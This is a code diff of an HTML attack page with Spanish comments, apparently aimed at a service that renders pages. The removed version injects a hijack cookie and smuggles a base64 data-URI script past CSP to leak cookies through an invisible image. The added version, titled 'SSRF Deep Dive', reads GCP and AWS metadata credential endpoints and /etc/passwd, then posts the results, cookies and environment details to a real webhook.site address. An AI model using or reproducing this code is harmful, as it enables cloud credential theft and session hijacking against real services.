@@ -1,80 +1,59 @@
 <!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Exfiltración Real</title>
-    <style>
-        body { font-family: monospace; padding: 20px; background: #1e1e1e; color: #00ff00; }
-        h1 { color: #fff; }
-        #console { background: #000; padding: 15px; border-radius: 8px; white-space: pre-wrap; border: 1px solid #333; min-height: 200px; }
-        .success { color: #00ff00; font-weight: bold; }
-        .error { color: #ff0000; }
-        .info { color: #ffff00; }
-    </style>
-</head>
+<html>
 <body>
-    <h1>Exfiltración Vía Imagen</h1>
-    <div id="console">Iniciando...</div>
-
+    <h2>SSRF Deep Dive</h2>
     <script>
-        const consola = document.getElementById('console');
         const webhookUrl = "https://webhook.site/e223390b-32c0-4bfa-ab49-15cc45e09f7a";
 
-        function log(msg, className) {
-            const line = document.createElement('div');
-            line.className = className || '';
-            line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            consola.appendChild(line);
-            consola.scrollTop = consola.scrollHeight;
+        async function exfiltrate(data, label) {
+            try {
+                // Usamos fetch para enviar los datos al webhook
+                await fetch(`${webhookUrl}?leak=${label}`, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify(data)
+                });
+            } catch(e) {}
         }
 
-        log("Iniciando inyección...", "info");
+        async function runAttack() {
+            // 1. Intentar leer metadatos de Google Cloud (SSRF)
+            try {
+                const gcpRes = await fetch("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", {
+                    headers: { "Metadata-Flavor": "Google" }
+                });
+                const gcpData = await gcpRes.text();
+                exfiltrate(gcpData, "gcp_token");
+            } catch(e) {
+                exfiltrate("Fallo GCP: " + e.message, "gcp_error");
+            }
 
-        // 1. Inyectamos la cookie
-        try {
-            document.cookie = "muse_session_hijacked=CUENTA_2_HACKEADA; path=/; domain=.metaaivm.com; secure; SameSite=None";
-            log("✅ Cookie inyectada: " + document.cookie, "success");
-        } catch (e) {
-            log("❌ Error al inyectar: " + e.message, "error");
+            // 2. Intentar leer metadatos de AWS (SSRF)
+            try {
+                const awsRes = await fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/");
+                const awsData = await awsRes.text();
+                exfiltrate(awsData, "aws_creds");
+            } catch(e) {
+                exfiltrate("Fallo AWS: " + e.message, "aws_error");
+            }
+
+            // 3. Intentar leer el archivo /etc/passwd (LFI) vía fetch local
+            try {
+                const lfiRes = await fetch("file:///etc/passwd");
+                const lfiData = await lfiRes.text();
+                exfiltrate(lfiData, "lfi_passwd");
+            } catch(e) {}
+
+            // 4. Enviar las variables de entorno del navegador/bot
+            exfiltrate({
+                userAgent: navigator.userAgent,
+                origin: window.location.origin,
+                cookies: document.cookie,
+                timestamp: new Date().toISOString()
+            }, "env_info");
         }
 
-        // 2. Exfiltración vía Data URI + Image Tag
-        log("Intentando exfiltrar vía Data URI + <img>...", "info");
-        
-        try {
-            // El payload crea una imagen invisible y le pone la URL con las cookies
-            const exfilPayload = `
-                try {
-                    // Leemos las cookies
-                    const data = document.cookie;
-                    
-                    // Creamos la imagen invisible
-                    const img = new Image();
-                    img.src = "${webhookUrl}?exfil_img=true&cookies=" + encodeURIComponent(data);
-                    
-                    // La añadimos al DOM para forzar la carga
-                    document.body.appendChild(img);
-                    
-                    console.log("Imagen de exfiltración inyectada.");
-                } catch(e) {
-                    console.error(e);
-                }
-            `;
-            
-            // Ejecutamos el payload en un Data URI (evade el CSP de scripts)
-            const base64Payload = btoa(unescape(encodeURIComponent(exfilPayload)));
-            
-            // Creamos un script dinámico con el Data URI
-            const script = document.createElement('script');
-            script.src = "data:text/javascript;base64," + base64Payload;
-            document.body.appendChild(script);
-            
-            log("✅ Script de exfiltración inyectado. Revisa el webhook.", "success");
-
-        } catch (e) {
-            log("❌ Error al preparar exfiltración: " + e.message, "error");
-        }
+        runAttack();
     </script>
 </body>
 </html>
